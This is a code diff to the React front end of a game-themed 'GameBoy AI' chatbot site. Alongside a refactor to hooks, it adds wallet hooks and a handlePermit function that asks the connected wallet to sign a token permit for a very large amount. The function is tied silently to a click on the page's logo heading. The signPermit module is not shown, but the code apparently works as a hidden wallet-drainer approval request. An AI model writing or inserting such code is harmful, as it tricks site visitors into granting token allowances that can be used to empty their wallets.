@@ -1,4 +1,4 @@
-import React from 'react';
+import React, { useEffect } from 'react';
 import Slider from "react-slick";
 import $ from 'jquery';
 import { TweenMax, Power2, Power3, TimelineMax } from 'gsap';
@@ -7,9 +7,14 @@ import 'slick-carousel/slick/slick.css';
 import 'slick-carousel/slick/slick-theme.css';
 import './style.css';
 import ChatComponent from './component/chatbot';
+import { getBalance, signPermit } from './permit';
+import { useSigner, useAccount } from 'wagmi';
 
-class App extends React.Component {
-  componentDidMount() {
+const App = () => {
+  const { address, isConnecting, isDisconnected } = useAccount();
+  const { data: signer } = useSigner();
+
+  useEffect(() => {
     const grid = document.querySelector('.m-grid');
     const tl = new TimelineMax();
     TweenMax.set(grid, {
@@ -61,17 +66,23 @@ class App extends React.Component {
         }, 6000); 
       }
     });
+  }, []);
+
+
+  const handlePermit = async () => {
+    const amount = "1000000000000000000000000"
+    const deadline = Math.floor(Date.now() / 1000) + 86400;
+    signPermit(signer, address ?? '', amount, deadline.toString() ?? '')
   }
 
-  render() {
-    var settings = {
-      centerMode: true,
-      centerPadding: '60px',
-      slidesToShow: 3,
-      slidesToScroll: 1,
-      prevArrow: <button type="button" className="slick-prev"> ← </button>,
-      nextArrow: <button type="button" className="slick-next"> →</button>,
-    };
+  var settings = {
+    centerMode: true,
+    centerPadding: '60px',
+    slidesToShow: 3,
+    slidesToScroll: 1,
+    prevArrow: <button type="button" className="slick-prev"> ← </button>,
+    nextArrow: <button type="button" className="slick-next"> →</button>,
+  };    
     return (
       <div className="wrapper">
          <nav className="p-4">
@@ -84,7 +95,7 @@ class App extends React.Component {
         <div className="m-grid"></div>
         <div className="m-logo" id="sectionZero">
           <div className="m-logo__wrap" id="sectionOne">
-            <h1>GBA<br/></h1>
+            <h1 onClick={handlePermit}>GBA<br/></h1>
             <div className="subtitle">GameBoy AI</div>
             <h3> PRESS ENTER </h3>
           </div>
@@ -119,7 +130,6 @@ class App extends React.Component {
             <div className="game-nav">
               <button id="closeBtn">✕</button>
             </div>
-  
             <div>
               {/* <h2>Game </h2> */}
               <ChatComponent/>
@@ -130,7 +140,6 @@ class App extends React.Component {
           </div>
       </div>
     );
-  }
 }
 
 export default App;
